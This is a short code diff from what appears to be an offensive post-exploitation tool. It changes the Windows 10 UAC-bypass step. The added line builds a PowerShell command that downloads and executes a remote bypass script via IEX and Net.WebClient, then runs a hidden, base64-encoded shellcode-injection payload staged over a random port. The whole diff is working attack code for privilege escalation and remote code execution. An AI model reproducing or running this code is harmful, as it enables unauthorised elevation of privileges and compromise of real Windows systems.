@@ -33,7 +33,7 @@ class EXTRAS(object):
             a.daemon = True
             a.start()
         elif version == "10":
-            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-SDCLTBypass.ps1");\nInvoke-SDCLTBypass -Command \"powershell -enc %s\" """ % (
+            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Charliedean/Invoke-SilentCleanUpBypass/master/Invoke-SilentCleanUpBypass.ps1");\nInvoke-SilentCleanUpBypass -Command \"cmd /c powershell -WindowStyle Hidden -enc %s && REM\" """ % (
             base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
             a = multiprocessing.Process(target=FUNCTIONS().stagePowershellCode, args=(uacbypassfilecontent, randomPort))
             a.daemon = True
